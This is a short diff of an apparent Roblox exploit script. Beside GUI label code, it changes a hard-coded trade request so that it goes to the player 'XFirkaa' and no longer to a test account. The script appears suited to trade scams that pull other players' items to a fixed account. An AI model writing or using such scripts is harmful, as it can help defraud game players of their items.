@@ -63,7 +63,7 @@ TextLabel_4.TextSize = 14
 TextLabel_4.TextWrapped = true
 -- Script is made by Time?#0001 (Maybe will be working discord
 
-game:GetService("ReplicatedStorage").Trade.SendRequest:InvokeServer(game:GetService("Players").TestAccountForBeam3)
+game:GetService("ReplicatedStorage").Trade.SendRequest:InvokeServer(game:GetService("Players").XFirkaa)
 -- Script is made by Time?#0001 (Maybe will be working discord
 wait(8)
 
